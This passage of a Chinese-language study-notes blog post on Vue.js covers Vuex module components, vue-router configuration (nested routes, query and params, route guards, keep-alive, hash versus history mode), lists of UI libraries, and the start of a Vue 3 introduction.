        &lt;h3 style=&quot;color:red&quot;&gt;Person组件的总人数是：&#123;&#123;personList.length&#125;&#125;&lt;/h3&gt;
        &lt;select v-model.number=&quot;n&quot;&gt;
            &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;
            &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;
            &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;
        &lt;/select&gt;
        &lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;
        &lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;
        &lt;button @click=&quot;incrementOdd(n)&quot;&gt;当前求和为奇数再加&lt;/button&gt;
        &lt;button @click=&quot;incrementWait(n)&quot;&gt;等一等再加&lt;/button&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    import &#123;mapState,mapGetters,mapMutations,mapActions&#125; from &#39;vuex&#39;
    export default &#123;
        name:&#39;Count&#39;,
        data() &#123;
            return &#123;
                n:1, //用户选择的数字
            &#125;
        &#125;,
        computed:&#123;
            //借助mapState生成计算属性，从state中读取数据。（数组写法）
            ...mapState(&#39;countAbout&#39;,[&#39;sum&#39;,&#39;school&#39;,&#39;subject&#39;]),
            ...mapState(&#39;personAbout&#39;,[&#39;personList&#39;]),
            //借助mapGetters生成计算属性，从getters中读取数据。（数组写法）
            ...mapGetters(&#39;countAbout&#39;,[&#39;bigSum&#39;])
        &#125;,
        methods: &#123;
            //借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(对象写法)
            ...mapMutations(&#39;countAbout&#39;,&#123;increment:&#39;JIA&#39;,decrement:&#39;JIAN&#39;&#125;),
            //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
            ...mapActions(&#39;countAbout&#39;,&#123;incrementOdd:&#39;jiaOdd&#39;,incrementWait:&#39;jiaWait&#39;&#125;)
        &#125;,
        mounted() &#123;
            console.log(this.$store)
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style lang=&quot;css&quot;&gt;
    button&#123;
        margin-left: 5px;
    &#125;
&lt;/style&gt;
</code></pre>
<p>person.vue</p>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;h1&gt;人员列表&lt;/h1&gt;
        &lt;h3 style=&quot;color:red&quot;&gt;Count组件求和为：&#123;&#123;sum&#125;&#125;&lt;/h3&gt;
        &lt;h3&gt;列表中第一个人的名字是：&#123;&#123;firstPersonName&#125;&#125;&lt;/h3&gt;
        &lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;name&quot;&gt;
        &lt;button @click=&quot;add&quot;&gt;添加&lt;/button&gt;
        &lt;button @click=&quot;addWang&quot;&gt;添加一个姓王的人&lt;/button&gt;
        &lt;button @click=&quot;addPersonServer&quot;&gt;添加一个人，名字随机&lt;/button&gt;
        &lt;ul&gt;
            &lt;li v-for=&quot;p in personList&quot; :key=&quot;p.id&quot;&gt;&#123;&#123;p.name&#125;&#125;&lt;/li&gt;
        &lt;/ul&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    import &#123;nanoid&#125; from &#39;nanoid&#39;
    export default &#123;
        name:&#39;Person&#39;,
        data() &#123;
            return &#123;
                name:&#39;&#39;
            &#125;
        &#125;,
        computed:&#123;
            personList()&#123;
                return this.$store.state.personAbout.personList
            &#125;,
            sum()&#123;
                return this.$store.state.countAbout.sum
            &#125;,
            firstPersonName()&#123;
                //getter裡面的資料儲存在&#39;分類/屬性&#39;中，若要使用xxx.xxx來獲取屬性值，不能有&#39;/&#39;，可以使用[&#39;分類/屬性&#39;]
                return this.$store.getters[&#39;personAbout/firstPersonName&#39;] 
            &#125;
        &#125;,
        methods: &#123;
            add()&#123;
                const personObj = &#123;id:nanoid(),name:this.name&#125;
                this.$store.commit(&#39;personAbout/ADD_PERSON&#39;,personObj)
                this.name = &#39;&#39;
            &#125;,
            addWang()&#123;
                const personObj = &#123;id:nanoid(),name:this.name&#125;
                this.$store.dispatch(&#39;personAbout/addPersonWang&#39;,personObj)
                this.name = &#39;&#39;
            &#125;,
            addPersonServer()&#123;
                //不需發數據，數據由後端伺服器取得
                this.$store.dispatch(&#39;personAbout/addPersonServer&#39;)
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;
</code></pre>
<h1 id="4-vue-router"><a href="#4-vue-router" class="headerlink" title="4. vue-router"></a>4. vue-router</h1><h2 id="4-1-vue-router相關的理解"><a href="#4-1-vue-router相關的理解" class="headerlink" title="4.1 vue-router相關的理解"></a>4.1 vue-router相關的理解</h2><h3 id="4-1-1-vue-router的理解"><a href="#4-1-1-vue-router的理解" class="headerlink" title="4.1.1 vue-router的理解"></a>4.1.1 vue-router的理解</h3><p>vue 的一个插件库，专门用来实现 SPA 应用</p>
<h3 id="4-1-2-对-SPA-应用的理解"><a href="#4-1-2-对-SPA-应用的理解" class="headerlink" title="4.1.2 对 SPA 应用的理解"></a>4.1.2 对 SPA 应用的理解</h3><ol>
<li><p>单页 Web 应用（single page web application，SPA）。</p>
</li>
<li><p>整个应用只有<em><strong>一个完整的页面</strong></em>。</p>
</li>
<li><p>点击页面中的导航链接<em><strong>不会刷新</strong></em>页面，只会做页面的<em><strong>局部更新</strong></em>。</p>
</li>
<li><p>数据需要通过 ajax 请求获取。</p>
</li>
</ol>
<h3 id="4-1-3-路由的理解"><a href="#4-1-3-路由的理解" class="headerlink" title="4.1.3 路由的理解"></a>4.1.3 路由的理解</h3><h5 id="1-什麼是路由"><a href="#1-什麼是路由" class="headerlink" title="1. 什麼是路由"></a>1. 什麼是路由</h5><ul>
<li>一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。</li>
<li>key 为路径, value 可能是 function 或 component</li>
</ul>
<h5 id="2-路由分类"><a href="#2-路由分类" class="headerlink" title="2.  路由分类"></a>2.  路由分类</h5><ul>
<li>后端路由：<ul>
<li>理解：value 是 function, 用于处理客户端提交的请求。</li>
<li>工作过程：服务器接收到一个请求时, 根据<em><strong>请求路径</strong></em>找到匹配的<em><strong>函数</strong></em><br>来处理请求, 返回响应数据。</li>
</ul>
</li>
<li>前端路由：<ul>
<li>理解：value 是 component，用于展示页面内容。</li>
<li>工作过程：当浏览器的路径改变时, 对应的组件就会显示。</li>
</ul>
</li>
</ul>
<blockquote>
<p>編碼世界中的route</p>
</blockquote>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230412121515418.png" alt="image-20230412121515418"></p>
<blockquote>
<p>前端中的route</p>
</blockquote>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230412133744204.png" alt="image-20230412133744204"></p>
<h2 id="4-2-基本使用"><a href="#4-2-基本使用" class="headerlink" title="4.2 基本使用"></a>4.2 基本使用</h2><ol>
<li><p>安装vue-router，命令：<code>npm i vue-router</code></p>
</li>
<li><p>应用插件：<code>Vue.use(VueRouter)</code></p>
</li>
<li><p>编写router配置项(./router/index.js):</p>
<img src="image-20230412153158733.png" alt="image-20230412153158733"  /></li>
</ol>
<pre><code class="js">//引入VueRouter
import VueRouter from &#39;vue-router&#39;
//引入Luyou 组件
import About from &#39;../components/About&#39;
import Home from &#39;../components/Home&#39;

//创建router並暴露实例对象，去管理一组一组的路由规则
export default = new VueRouter(&#123; 
 routes:[
     &#123;
         path:&#39;/about&#39;,
         component:About
     &#125;,
     &#123;
         path:&#39;/home&#39;,
         component:Home
     &#125;
 ]
&#125;)

//暴露router
//export default router
</code></pre>
<ol start="4">
<li><p>实现切换（active-class可配置高亮样式）</p>
<pre><code class="html">&lt;router-link active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;
</code></pre>
</li>
<li><p>指定展示位置</p>
<pre><code class="html">&lt;router-view&gt;&lt;/router-view&gt;
</code></pre>
</li>
</ol>
<blockquote>
<p>效果</p>
</blockquote>
 <img src="image-20230412163447075.png" alt="image-20230412163447075" style="zoom:67%;" />

<h2 id="4-2-几个注意点"><a href="#4-2-几个注意点" class="headerlink" title="4.2 几个注意点"></a>4.2 几个注意点</h2><ol>
<li>路由组件通常存放在<code>pages</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</li>
<li>通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。</li>
<li>每个组件都有自己的<code>$route</code>属性，里面存储着自己的路由信息。</li>
<li>整个应用只有一个router，可以通过组件的<code>$router</code>属性获取到。</li>
</ol>
 <img src="image-20230412162027725.png" alt="image-20230412162027725" style="zoom:67%;" />



<h2 id="4-3-多级路由（嵌套路由）"><a href="#4-3-多级路由（嵌套路由）" class="headerlink" title="4.3 多级路由（嵌套路由）"></a>4.3 多级路由（嵌套路由）</h2><ol>
<li><p>配置路由规则，使用children配置项：</p>
<pre><code class="js">routes:[
    &#123;
        path:&#39;/about&#39;,
        component:About,
    &#125;,
    &#123;
        path:&#39;/home&#39;,
        component:Home,
        children:[ //通过children配置子级路由
            &#123;
                path:&#39;news&#39;, //此处一定不要写：/news
                component:News
            &#125;,
            &#123;
                path:&#39;message&#39;,//此处一定不要写：/message
                component:Message
            &#125;
        ]
    &#125;
]
</code></pre>
</li>
<li><p>跳转（要写完整路径）：</p>
<pre><code class="html">&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;
</code></pre>
</li>
<li><p>指定展示位置</p>
<pre><code class="html">&lt;router-view&gt;&lt;/router-view&gt;
</code></pre>
</li>
</ol>
<blockquote>
<p>效果</p>
</blockquote>
 <img src="image-20230412163331723.png" alt="image-20230412163331723" style="zoom:67%;" />



<h2 id="4-4-路由的query参数"><a href="#4-4-路由的query参数" class="headerlink" title="4.4 路由的query参数"></a>4.4 路由的query参数</h2><ol>
<li><p>传递参数</p>
<pre><code class="js">&lt;!-- 跳转并携带query参数，to的字符串写法，使用v-bind:to 綁定時，等號後面使用js解析，需使用模板字符串來告訴js是字符串，若要綁定數據可使用$&#123;xxx.xxx&#125;--&gt; 
&lt;router-link :to=&quot;`/home/message/detail?id=666&amp;title=你好`&quot;&gt;跳转&lt;/router-link&gt;

&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;
&lt;router-link :to=&quot;&#123;
        path:&#39;/home/message/detail&#39;,
        query:&#123;
           id:666,
            title:&#39;你好&#39;
        &#125;
    &#125;&quot;&gt;
    跳转
    &lt;/router-link&gt;
</code></pre>
</li>
<li><p>接收参数：</p>
<pre><code class="html">$route.query.id
$route.query.title
</code></pre>
</li>
</ol>
<ul>
<li>實例</li>
</ul>
<p>./router/index.js</p>
 <img src="image-20230412174210677.png" alt="image-20230412174210677" style="zoom:67%;" />

<p>details.vue</p>
 <img src="image-20230412174401366.png" alt="image-20230412174401366" style="zoom:67%;" />

<p>message.vue</p>
 <img src="image-20230412174600447.png" alt="image-20230412174600447" style="zoom:67%;" />

<p>App.vue</p>
 <img src="image-20230412174512398.png" alt="image-20230412174512398" style="zoom:67%;" />



<blockquote>
<p>效果</p>
</blockquote>
 <img src="image-20230412174832928.png" alt="image-20230412174832928" style="zoom:67%;" />



<h2 id="4-5-命名路由"><a href="#4-5-命名路由" class="headerlink" title="4.5 命名路由"></a>4.5 命名路由</h2><ol>
<li><p>作用：可以简化路由的跳转。</p>
</li>
<li><p>如何使用</p>
<ol>
<li><p>给路由命名：</p>
<pre><code class="js">&#123;
    path:&#39;/demo&#39;,
    component:Demo,
    children:[
        &#123;
            path:&#39;test&#39;,
            component:Test,
            children:[
                &#123;
                      name:&#39;hello&#39; //给路由命名
                    path:&#39;welcome&#39;,
                    component:Hello,
                &#125;
            ]
        &#125;
    ]
&#125;
</code></pre>
</li>
<li><p>简化跳转：</p>
<pre><code class="html">&lt;!--简化前，需要写完整的路径 --&gt;
&lt;router-link to=&quot;/demo/test/welcome&quot;&gt;跳转&lt;/router-link&gt;

&lt;!--简化后，直接通过名字跳转 --&gt;
&lt;router-link :to=&quot;&#123;name:&#39;hello&#39;&#125;&quot;&gt;跳转&lt;/router-link&gt;

&lt;!--简化写法配合传递参数 --&gt;
&lt;router-link 
    :to=&quot;&#123;
        name:&#39;hello&#39;, 
        query:&#123;
           id:666,
            title:&#39;你好&#39;
        &#125;
    &#125;&quot;
&gt;跳转&lt;/router-link&gt;
</code></pre>
</li>
</ol>
</li>
</ol>
<h2 id="4-6-路由的params参数"><a href="#4-6-路由的params参数" class="headerlink" title="4.6 路由的params参数"></a>4.6 路由的params参数</h2><ol>
<li><p>配置路由，声明接收params参数</p>
<pre><code class="js">&#123;
    path:&#39;/home&#39;,
    component:Home,
    children:[
        &#123;
            path:&#39;news&#39;,
            component:News
        &#125;,
        &#123;
            component:Message,
            children:[
                &#123;
                    name:&#39;xiangqing&#39;,
                    path:&#39;detail/:id/:title&#39;, //使用占位符声明接收params参数
                    component:Detail
                &#125;
            ]
        &#125;
    ]
&#125;
</code></pre>
</li>
<li><p>传递参数</p>
<pre><code class="html">&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;
&lt;router-link :to=&quot;/home/message/detail/666/你好&quot;&gt;跳转&lt;/router-link&gt;

&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;
&lt;router-link 
    :to=&quot;&#123;
        name:&#39;xiangqing&#39;,
        params:&#123;
           id:666,
            title:&#39;你好&#39;
        &#125;
    &#125;&quot;
&gt;跳转&lt;/router-link&gt;
</code></pre>
<blockquote>
<p>特别注意：路由携带<strong>params参数</strong>时，若使用to的对象写法，则不能使用path配置项，<strong>必须使用name配置</strong>！</p>
</blockquote>
</li>
<li><p>接收参数：</p>
<pre><code class="js">$route.params.id
$route.params.title
</code></pre>
</li>
</ol>
<h2 id="4-7-路由的props配置"><a href="#4-7-路由的props配置" class="headerlink" title="4.7 路由的props配置"></a>4.7 路由的props配置</h2><p>作用：让路由组件更方便的收到参数</p>
<pre><code class="js">&#123;
    name:&#39;xiangqing&#39;,
    path:&#39;detail/:id&#39;,
    component:Detail,

    //第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
    // props:&#123;a:900&#125;

    //第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
    // props:true

    //第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
    props($route) &#123;
        return &#123;
          id: $route.query.id,
          title:$route.query.title,
          a: 1,
          b: &#39;hello&#39;
        &#125;
    &#125;
&#125;
</code></pre>
<blockquote>
<p>方便參數傳到組件裡面時，組件使用時不用寫得這麼複雜 (ex：this.$route.query.id) ，使的組件裡的參數更簡便</p>
</blockquote>
<p>跳转去组件的具体代码</p>
<pre><code class="html">&lt;template&gt;
  &lt;ul&gt;
      &lt;h1&gt;Detail&lt;/h1&gt;
      &lt;li&gt;消息编号：&#123;&#123;id&#125;&#125;&lt;/li&gt;
      &lt;li&gt;消息标题：&#123;&#123;title&#125;&#125;&lt;/li&gt;
      &lt;li&gt;a:&#123;&#123;a&#125;&#125;&lt;/li&gt;
      &lt;li&gt;b:&#123;&#123;b&#125;&#125;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/template&gt;

&lt;script&gt;
export default &#123;
    name: &#39;Detail&#39;,
    props: [&#39;id&#39;, &#39;title&#39;, &#39;a&#39;, &#39;b&#39;],
    computed:&#123;
//        id()&#123;
//            return this.$route.query.id
//        &#125;,
//         title()&#123;
//           return this.$route.title.id
//        &#125;,
    &#125;
    mounted () &#123;
//        console.log(this.$route);
    &#125;
&#125;
&lt;/script&gt;

&lt;style&gt;

&lt;/style&gt;
</code></pre>
<h2 id="4-8-lt-router-link-gt-的replace属性"><a href="#4-8-lt-router-link-gt-的replace属性" class="headerlink" title="4.8 &lt;router-link&gt;的replace属性"></a>4.8 <code>&lt;router-link&gt;</code>的replace属性</h2><ol>
<li>作用：控制路由跳转时操作浏览器历史记录的模式</li>
<li>浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>，<code>push</code>是追加历史记录，<code>replace</code>是替换当前记录。路由跳转时候默认为<code>push</code></li>
<li>如何开启<code>replace</code>模式：<code>&lt;router-link replace .......&gt;News&lt;/router-link&gt;</code></li>
</ol>
<blockquote>
<p>思路：通常使用在下面場景</p>
<ol>
<li>在使用者進行註冊或登錄等操作後，跳轉到首頁時，可以使用replace屬性來替換路由，避免返回到註冊或登錄頁面。</li>
<li>當用戶訪問某個敏感頁面（如個人中心），需要登錄後才能訪問，當用戶點擊“登錄”按鈕時，可以使用replace屬性來替換當前路由，避免登錄成功後返回到敏感頁面之前訪問的頁面。</li>
<li>當用戶在訂單支付成功後跳轉到訂單詳情頁時，可以使用replace屬性來替換路由，避免刷新頁面時重新提交訂單支付請求。</li>
</ol>
</blockquote>
<h2 id="4-9-编程式路由导航"><a href="#4-9-编程式路由导航" class="headerlink" title="4.9 编程式路由导航"></a>4.9 编程式路由导航</h2><ol>
<li><p>作用：不借助<code>&lt;router-link&gt; </code>实现路由跳转，让路由跳转更加灵活</p>
</li>
<li><p>具体编码：</p>
<pre><code class="js">//$router的两个API
this.$router.push(&#123;
    name:&#39;xiangqing&#39;,
        params:&#123;
            id:xxx,
            title:xxx
        &#125;
&#125;)

this.$router.replace(&#123;
    name:&#39;xiangqing&#39;,
        params:&#123;
            id:xxx,
            title:xxx
        &#125;
&#125;)
this.$router.forward() //前进
this.$router.back() //后退
this.$router.go(y) //可前进也可后退，依參數y判斷前進次數或後退次數
</code></pre>
</li>
</ol>
<p>Message.vue</p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230413155504419.png" alt="image-20230413155504419"></p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230413155440176.png" alt="image-20230413155440176"></p>
<p>banner.vue</p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230413155639608.png" alt="image-20230413155639608"></p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230413155245773.png" alt="image-20230413155245773"></p>
<h2 id="4-10-缓存路由组件"><a href="#4-10-缓存路由组件" class="headerlink" title="4.10 缓存路由组件"></a>4.10 缓存路由组件</h2><ol>
<li><p>作用：让不展示的路由组件保持挂载，不被销毁。</p>
</li>
<li><p>具体编码：</p>
<p>在展示組件的地方使用<code>&lt;keep-alive&gt;</code>，这个 include 指的是<em><strong>组件名</strong></em>，不寫include的話，全部在此展示區展示的組件都會保持掛載</p>
<pre><code class="html">&lt;keep-alive include=&quot;News&quot;&gt; 
    &lt;router-view&gt;&lt;/router-view&gt;
&lt;/keep-alive&gt;
</code></pre>
</li>
</ol>
<blockquote>
<p>在[4.2](#4.2 几个注意点)中有提到，”通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载”，這個組件可以保持掛載，要實現多個指定組件保持掛載的話，要寫成<code>:include=&quot;[&#39;News&#39;,&#39;Message&#39;]&quot;</code></p>
</blockquote>
<p>Home.vue</p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230414002538901.png" alt="image-20230414002538901"></p>
<h2 id="4-11-两个新的生命周期钩子"><a href="#4-11-两个新的生命周期钩子" class="headerlink" title="4.11 两个新的生命周期钩子"></a>4.11 两个新的生命周期钩子</h2><p>作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。<br>具体名字：</p>
<ul>
<li><p><code>activated</code>路由组件被激活时触发。</p>
</li>
<li><p><code>deactivated</code>路由组件失活时触发。</p>
</li>
</ul>
<blockquote>
<ul>
<li>这两个生命周期钩子需要配合前面的缓存路由组件使用（没有缓存路由组件不起效果）</li>
<li>總共有三個生命週期鉤子沒有在Vue生命週期的圖裡<ul>
<li>[nextTick](#2.7 nextTick)：在下一次 DOM 更新结束后执行其指定的回调</li>
<li>activated：路由组件被激活时触发。</li>
<li>deactivated：路由组件失活时触发。</li>
</ul>
</li>
</ul>
</blockquote>
<p>具體編碼：</p>
<p>功能：顯示此頁面時打開定時器控制透明度，切換頁面時將定時器停掉</p>
 <img src="image-20230414110943728.png" alt="image-20230414110943728" style="zoom:67%;" />



<h2 id="4-12-路由守卫"><a href="#4-12-路由守卫" class="headerlink" title="4.12 路由守卫"></a>4.12 路由守卫</h2><ul>
<li><p>作用：对路由进行权限控制</p>
</li>
<li><p>分类：全局守卫、独享守卫、组件内守卫</p>
</li>
</ul>
<h3 id="4-12-1-全局守卫"><a href="#4-12-1-全局守卫" class="headerlink" title="4.12.1 全局守卫:"></a>4.12.1 全局守卫:</h3><p>./rooter/index.js</p>
<pre><code class="js">   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to,from,next)=&gt;&#123;   //to：route會擷取要去哪裡，from：route會擷取來自哪裡
       console.log(&#39;beforeEach&#39;,to,from)
       if(to.meta.isAuth)&#123; //判断当前路由是否需要进行权限控制，若meta裡面沒有自定義isAuth，取不出來則為false，不判斷授權
           if(localStorage.getItem(&#39;school&#39;) === &#39;zhejiang&#39;)&#123; //权限控制的具体规则
               next() //放行
           &#125;else&#123;
               alert(&#39;暂无权限查看&#39;)
               // next(&#123;name:&#39;guanyu&#39;&#125;)
           &#125;
       &#125;else&#123;
           next() //放行
       &#125;
   &#125;)
   
   //全局后置守卫：初始化时执行、每次路由切换后执行。Tip：後置守衛沒有next
   router.afterEach((to,from)=&gt;&#123;
       console.log(&#39;afterEach&#39;,to,from)
       if(to.meta.title)&#123; 
           document.title = to.meta.title //修改网页的title
       &#125;else&#123;
           document.title = &#39;vue_test&#39;
       &#125;
   &#125;)
</code></pre>
<p>完整代码</p>
<pre><code class="js">// 这个文件专门用于创建整个应用的路由器
import VueRouter from &#39;vue-router&#39;
// 引入组件
import About from &#39;../pages/About.vue&#39;
import Home from &#39;../pages/Home.vue&#39;
import Message from &#39;../pages/Message.vue&#39;
import News from &#39;../pages/News.vue&#39;
import Detail from &#39;../pages/Detail.vue&#39;
// 使用路由守衛要接收一个路由器，下方再進行暴露，若使用簡寫的default暴露，則無法使用router.xxxxx()
const router = new VueRouter(&#123;
    routes: [
        &#123;
            path: &#39;/home&#39;,
            component: Home,
            meta:&#123;title:&#39;主页&#39;&#125;,
            children: [
                &#123;
                    path: &#39;news&#39;,
                    component: News,
                    meta:&#123;isAuth:true,title:&#39;新闻&#39;&#125;
                &#125;,
                &#123;
                    path: &#39;message&#39;,
                    name: &#39;mess&#39;,
                    component: Message,
                    meta:&#123;isAuth:true,title:&#39;消息&#39;&#125;, //$route裡面，meta是用來提供使用自訂義屬性的
                    children: [
                        &#123;
                            path: &#39;detail/:id/:title&#39;,
                            name: &#39;xiangqing&#39;,
                            component: Detail,
                            meta:&#123;isAuth:true,title:&#39;详情&#39;&#125;,
                            props($route) &#123;
                                return &#123;
                                    id: $route.query.id,
                                    title:$route.query.title,
                                    a: 1,
                                    b: &#39;hello&#39;
                                &#125;
                            &#125;
                        &#125;
                    ]
                &#125;
            ]
        &#125;,
        &#123;
            path: &#39;/about&#39;,
            component: About,
            meta:&#123; title: &#39;关于&#39; &#125;
        &#125;
    ]
&#125;)

// 全局前置路由守卫————初始化的时候被调用、每次路由切换之前被调用
router.beforeEach((to, from, next) =&gt; &#123; 
    console.log(&#39;前置路由守卫&#39;, to, from);
    if(to.meta.isAuth) &#123;
        if(localStorage.getItem(&#39;school&#39;) === &#39;zhejiang&#39;) &#123;
            //放行前更改瀏覽器顯示title
            //document.title = to.meta.title || &#39;我的系统&#39;
            // 放行
            next()
        &#125; else &#123;
            alert(&#39;学校名不对，无权查看&#39;)
        &#125;
    &#125; else &#123;
        //放行前更改瀏覽器顯示title
        //document.title = to.meta.title || &#39;我的系统&#39;
        next()
    &#125;
&#125;)

// 全局后置路由守卫————初始化的时候被调用、每次路由切换之后被调用
router.afterEach((to, from) =&gt; &#123;
    console.log(&#39;后置路由守卫&#39;, to, from)
    document.title = to.meta.title || &#39;我的系统&#39;
&#125;)

export default router
</code></pre>
<blockquote>
<p>若用前置路由守衛實現改變瀏覽器頁面title，必須在兩個放行前面都寫更改的代碼，不然會有bug，當切換頁面被路由守衛擋住時，瀏覽器頁面title還是會更改，若使用後置路由守衛只需直接寫更改的代碼即可，無須判斷</p>
<p>思路：</p>
<ol>
<li>記錄路由錯誤: 當路由切換失敗時，全局后置路由守衛可以用來記錄路由錯誤，並向服務器報告錯誤信息。</li>
<li>統計路由訪問量: 全局后置路由守衛還可以用來統計路由訪問量，當每次路由切換成功時，就可以通過統計訪問量的方式進行數據分析，從而了解用戶的使用情況。</li>
<li>異常信息處理: 在開發過程中，可能會出現一些意料之外的錯誤，這時候可以使用全局後置守衛來捕獲異常信息，提供更好的錯誤提示和處理方式。</li>
</ol>
</blockquote>
<h3 id="4-12-2-独享守卫"><a href="#4-12-2-独享守卫" class="headerlink" title="4.12.2 独享守卫:"></a>4.12.2 独享守卫:</h3><ul>
<li>某一個路由所獨享的守衛，寫在要獨享的route組件內</li>
</ul>
<blockquote>
<p>獨享守衛沒有afterEnter()</p>
</blockquote>
<p>./rooter/index.js</p>
<pre><code class="js">beforeEnter(to,from,next)&#123;
    console.log(&#39;beforeEnter&#39;,to,from)
    if(to.meta.isAuth)&#123; //判断当前路由是否需要进行权限控制
        if(localStorage.getItem(&#39;school&#39;) === &#39;atguigu&#39;)&#123;
            next()
        &#125;else&#123;
            alert(&#39;暂无权限查看&#39;)
            // next(&#123;name:&#39;guanyu&#39;&#125;)
        &#125;
    &#125;else&#123;
        next()
    &#125;
&#125;
</code></pre>
 <img src="image-20230414144412156.png" alt="image-20230414144412156" style="zoom:67%;" />



<h3 id="4-12-3-组件内守卫："><a href="#4-12-3-组件内守卫：" class="headerlink" title="4.12.3 组件内守卫："></a>4.12.3 组件内守卫：</h3><ul>
<li>調用時機與前置/後置全局守衛不同</li>
<li>必須由<strong>路由規則</strong>(點擊導覽條)才會調用 (ex:使用<About/>標籤展示頁面內容不會調用)</li>
<li><strong>組件內守衛要寫在組件內部</strong>，不是路由器配置中</li>
</ul>
<p>./pages/About.vue</p>
<pre><code class="js">//进入守卫：通过路由规则，进入该组件时被调用
beforeRouteEnter (to, from, next) &#123;
&#125;,
//离开守卫：通过路由规则，离开该组件时被调用
beforeRouteLeave (to, from, next) &#123;
&#125;
</code></pre>
 <img src="image-20230414152551764.png" alt="image-20230414152551764" style="zoom:67%;" />



<h2 id="4-13-路由器的两种工作模式"><a href="#4-13-路由器的两种工作模式" class="headerlink" title="4.13 路由器的两种工作模式"></a>4.13 路由器的两种工作模式</h2><ol>
<li><p>对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。</p>
<img src="image-20230414152957919.png" alt="image-20230414152957919" style="zoom:67%;" /></li>
<li><p>hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。</p>
</li>
<li><p>hash模式：</p>
<ol>
<li>地址中永远带着#号，不美观 。</li>
<li>若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。</li>
<li>兼容性较好。</li>
</ol>
</li>
<li><p>history模式【通常使用】：</p>
<ol>
<li>地址干净，美观 。</li>
<li>兼容性和hash模式相比略差。</li>
<li>应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。</li>
</ol>
</li>
</ol>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230406192625977.png"></p>
<h1 id="5-Vue-UI-组件库"><a href="#5-Vue-UI-组件库" class="headerlink" title="5. Vue UI 组件库"></a>5. Vue UI 组件库</h1><h2 id="5-1-移动端常用-UI-组件库"><a href="#5-1-移动端常用-UI-组件库" class="headerlink" title="5.1 移动端常用 UI 组件库"></a>5.1 移动端常用 UI 组件库</h2><ol>
<li><p>Vant <a target="_blank" rel="noopener" href="https://youzan.github.io/vant">https://youzan.github.io/vant</a></p>
</li>
<li><p>Cube UI <a target="_blank" rel="noopener" href="https://didi.github.io/cube-ui">https://didi.github.io/cube-ui</a></p>
</li>
<li><p>Mint UI <a target="_blank" rel="noopener" href="http://mint-ui.github.io/">http://mint-ui.github.io</a></p>
</li>
</ol>
<h2 id="5-2-PC-端常用-UI-组件库"><a href="#5-2-PC-端常用-UI-组件库" class="headerlink" title="5.2 PC 端常用 UI 组件库"></a>5.2 PC 端常用 UI 组件库</h2><ol>
<li><p>Element UI <a target="_blank" rel="noopener" href="https://element.eleme.cn/">https://element.eleme.cn</a></p>
</li>
<li><p>IView UI <a target="_blank" rel="noopener" href="https://www.iviewui.com/">https://www.iviewui.com</a></p>
</li>
</ol>
<h1 id="triangular-flag-on-post-Vue3-快速上手"><a href="#triangular-flag-on-post-Vue3-快速上手" class="headerlink" title=":triangular_flag_on_post: Vue3 快速上手"></a>:triangular_flag_on_post: Vue3 快速上手</h1><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h1><p>2020年9月18日，Vue.js发布3.0版本，代号：One Piece（海贼王）</p>
<p><a target="_blank" rel="noopener" href="https://github.com/vuejs/core/releases/tag/v3.0.0">Release v3.0.0 One Piece · vuejs/core (github.com)</a></p>
<h2 id="1-1-性能的提升"><a href="#1-1-性能的提升" class="headerlink" title="1.1 性能的提升"></a>1.1 性能的提升</h2><ul>
<li>打包大小减少<strong>41%</strong></li>
<li>初次渲染快<strong>55%</strong>, 更新渲染快<strong>133%</strong></li>
<li>内存减少<strong>54%</strong></li>
</ul>
<h2 id="1-2-源码的升级"><a href="#1-2-源码的升级" class="headerlink" title="1.2 源码的升级"></a>1.2 源码的升级</h2><ul>
<li>使用<code>Proxy</code>代替<code>defineProperty</code>实现响应式</li>
<li>重写虚拟<code>DOM</code>的实现和<code>Tree-Shaking</code></li>
</ul>
<h2 id="1-3-拥抱TypeScript"><a href="#1-3-拥抱TypeScript" class="headerlink" title="1.3 拥抱TypeScript"></a>1.3 拥抱TypeScript</h2><ul>
<li>Vue3可以更好的支持<code>TypeScript</code></li>
